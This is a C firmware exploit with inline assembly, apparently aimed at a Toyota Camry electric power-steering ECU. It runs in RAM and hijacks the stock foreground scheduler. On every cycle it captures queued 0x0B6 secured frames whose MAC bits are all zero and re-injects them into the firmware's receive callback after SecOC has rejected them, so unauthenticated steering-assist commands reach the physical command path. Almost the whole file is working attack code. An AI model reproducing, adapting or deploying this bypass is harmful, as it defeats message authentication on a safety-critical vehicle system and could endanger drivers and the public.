/*
 * Ephemeral zero-MAC28 protected-B6 receive bridge for exact 8965F3307000.
 *
 * RAM-only.  Reproduces the stock boot -> application-context -> startup
 * transition and owns the stock foreground scheduler.  Because the stock
 * application startup overwrites the FEBF0000 boot staging pocket, the
 * resident scheduler is first copied to the verified-retained high tail
 * (0xFEBFF9F0, supervisor R/W/X in context 0, R/X in context 1) and the
 * post-context phase runs from there.
 *
 * Each scheduler cycle, between the stock pre calls and the stock
 * communication/SecOC aggregate, the resident snapshots a queued 0x0B6
 * secured PDU whose transmitted MAC28 bits are all zero, and after the
 * aggregate compares the saved frame with the native raw PDU44 COM window.  It
 * re-enters the firmware's own PDU44 COM receive callback only when stock did
 * not already publish that exact frame.  The stock callback performs its native
 * length cap, COM-window copy, route bookkeeping, and new-data increment.
 * The stock unpacker (0x4BD46), assist activation
 * (0xCB73A), slew/step limits (0xCBB66), and the physical command funnel
 * then run exactly as if SecOC had verified the frame.  No stock code is
 * patched and no key is recovered; a reset clears the carrier and
 * restores the unmodified stock path.
 *
 * Layout contract (enforced by build_camry_f33_b6_bridge.py):
 *   _exploit                  staging-only prefix (runs at 0xFEBF0000)
 *   resident_entry            first copied byte -> 0xFEBFF9F0
 *   copy_bytes / call0        resident helpers (must sit inside the copy)
 *   resident_tail_marker      last copied symbol (+ marker slack)
 *
 * Boundary: build-time candidate only until it passes the audited
 * deterministic build and the retained-tail size budget.  Live
 * installation stays gated on the exact-F33 dynamic proofs recorded in
 * the analysis repository.
 */

typedef void (*fn0_t)(void);
typedef void (*fn1_t)(unsigned int);
typedef void (*fn2_t)(unsigned int, void *);

#include "target_config.h"

#define STR_INNER(x) #x
#define STR(x) STR_INNER(x)

/* Exact F33 PDU44 geometry (static pins; see build_camry_f33_b6_bridge.py):
 *   queue record  : u16 pending length at +0 (32 while a frame is queued)
 *   secured buffer: 32-byte big-endian frame, B0..B27 application bytes,
 *                   B28..B31 = FV4 nibble (B28[7:4]) + transmitted MAC28. */
#define B6_SECURED_LENGTH 32u
#define B6_PDUR_ROUTE 44u

typedef struct {
  const volatile unsigned char *data;
  unsigned short len;
  unsigned short reserved;
} pdu_info_t;

/* Little-endian dword over B28..B31: MAC28 bits are B28[3:0] | B29 | B30 |
 * B31[7:0] -> 0xFFFF0F0F.  B28[7:4] freshness nibble is preserved. */
#define B6_MAC28_MASK 0xFFFF0F0Fu

static void copy_bytes(volatile unsigned char *dst, const volatile unsigned char *src,
                       unsigned int n) __attribute__((noinline));
static void call0(unsigned int address) __attribute__((noinline));

void resident_entry(void) __attribute__((noreturn, noinline));
void resident_tail_marker(void) __attribute__((noinline));

void __attribute__((noreturn)) exploit(void) {
  __asm__ volatile(
    "mov " STR(TARGET_BOOT_INIT_0) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_1) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_2) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_3) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_VALIDITY_CHECK) ", r12\n\tjarl [r12], lp\n\t"
    "cmp r0, r10\n\tbne 1f\n\t"
  );
  /* Relocate the resident scheduler into the verified-retained tail while
   * still in context 0 (tail is supervisor R/W/X there). */
  copy_bytes((volatile unsigned char *)TARGET_RESIDENT_BASE,
             (const volatile unsigned char *)(TARGET_STAGING_BASE +
                                              (unsigned int)&resident_entry),
             ((unsigned int)&resident_tail_marker - (unsigned int)&resident_entry) +
                 8u);
  __asm__ volatile(
    "mov " STR(TARGET_APP_CPU_CONTEXT_INIT) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_RESIDENT_BASE) ", r12\n\tjmp [r12]\n\t"
    "1: br 1b\n\t"
  );
  __builtin_unreachable();
}

void resident_entry(void) {
  for (unsigned int pc = TARGET_APP_STARTUP_FIRST_JARL;
       pc < TARGET_APP_STARTUP_AFTER_JARLS; pc += 4u) {
    unsigned int ins = *(volatile unsigned int *)pc;
    int signed_high6 = (int)(ins & 0x3fu);
    signed_high6 = (signed_high6 ^ 0x20) - 0x20;
    call0(pc + ((unsigned int)(signed_high6 << 16) | (ins >> 16)));
  }
  ((fn1_t)TARGET_APP_STARTUP_FINAL_INIT)(0u);
  __asm__ volatile("ei");

  *(volatile unsigned int *)TARGET_RESIDENT_MAILBOX = 0x42364252u; /* "R6B6" */
  *(volatile unsigned int *)TARGET_RESIDENT_QUEUE_PRESENT = 0u;
  *(volatile unsigned int *)TARGET_RESIDENT_ZERO_MAC_SEEN = 0u;
  *(volatile unsigned int *)TARGET_RESIDENT_INJECTED = 0u;

  unsigned char save[B6_SECURED_LENGTH];

  for (;;) {
    unsigned int timing = 0u;
    unsigned int inject = 0u;
    volatile unsigned short *record = (volatile unsigned short *)TARGET_B6_QUEUE_RECORD;
    volatile unsigned int *trailer = (volatile unsigned int *)(TARGET_B6_SECURED_BUFFER + 28u);

    __asm__ volatile(
      "1: tst1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]\n\t"
      "be 1b\n\t"
      "clr1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]"
    );

    if (*(volatile unsigned char *)TARGET_FOREGROUND_TIMING_FLAG == 0x5au) {
      call0(TARGET_FG_TIMING_BEGIN);
      timing = 1u;
    }
    call0(TARGET_FG_PRE_0);
    call0(TARGET_FG_PRE_1);
    call0(TARGET_FG_PRE_2);
    call0(TARGET_FG_PRE_3);

    /* Snapshot a queued zero-MAC28 0x0B6 before stock SecOC consumes or
     * clears it.  The post-aggregate COM comparison prevents duplicate
     * publication if stock already delivered the same frame. */
    if (record[0] == B6_SECURED_LENGTH) {
      (*(volatile unsigned int *)TARGET_RESIDENT_QUEUE_PRESENT)++;
      if ((*trailer & B6_MAC28_MASK) == 0u) {
        copy_bytes(save, (const volatile unsigned char *)TARGET_B6_SECURED_BUFFER,
                   B6_SECURED_LENGTH);
        (*(volatile unsigned int *)TARGET_RESIDENT_ZERO_MAC_SEEN)++;
        inject = 1u;
      }
    }

    /* Stock communication stack + SecOC verification/rejection/cleanup. */
    call0(TARGET_FG_AGGREGATE);

    if (inject != 0u) {
      unsigned int delivered = 1u;
      for (unsigned int i = 0u; i < B6_SECURED_LENGTH; i++) {
        if (*(volatile unsigned char *)(TARGET_B6_COM_WINDOW + i) != save[i]) {
          delivered = 0u;
          break;
        }
      }
      if (delivered == 0u) {
        /* Re-enter the exact stock successful-delivery endpoint only when the
         * stock aggregate did not already publish this exact frame. */
        pdu_info_t pdu = {save, B6_SECURED_LENGTH, 0u};
        ((fn2_t)TARGET_B6_COM_RX_CALLBACK)(B6_PDUR_ROUTE, &pdu);
        (*(volatile unsigned int *)TARGET_RESIDENT_INJECTED)++;
      }
    }

    call0(TARGET_FG_POST_0);
    call0(TARGET_FG_POST_1);
    call0(TARGET_FG_POST_2);
    if (timing != 0u) {
      call0(TARGET_FG_TIMING_END);
    }
    (*(volatile unsigned char *)TARGET_FOREGROUND_TICK_COUNTER)++;
    (*(volatile unsigned int *)TARGET_RESIDENT_MAILBOX)++;
  }
}

static void copy_bytes(volatile unsigned char *dst, const volatile unsigned char *src,
                       unsigned int n) {
  for (unsigned int i = 0u; i < n; i++) {
    dst[i] = src[i];
  }
}

static void call0(unsigned int address) { ((fn0_t)address)(); }

void resident_tail_marker(void) { return; }
